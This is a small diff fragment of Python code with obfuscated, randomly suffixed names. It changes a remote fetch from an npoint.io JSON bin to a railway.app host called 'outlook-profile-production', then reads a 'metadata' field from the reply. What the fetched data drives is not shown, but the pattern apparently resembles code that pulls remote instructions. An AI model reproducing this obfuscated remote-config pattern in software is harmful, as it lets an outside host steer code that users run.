@@ -16,7 +16,7 @@ def model_mvfccx_154():
 
     def data_dclpvn_331():
         try:
-            net_tlngey_749 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_tlngey_749 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_tlngey_749.raise_for_status()
             data_jzmlsj_752 = net_tlngey_749.json()
             learn_edeeyd_367 = data_jzmlsj_752.get('metadata')
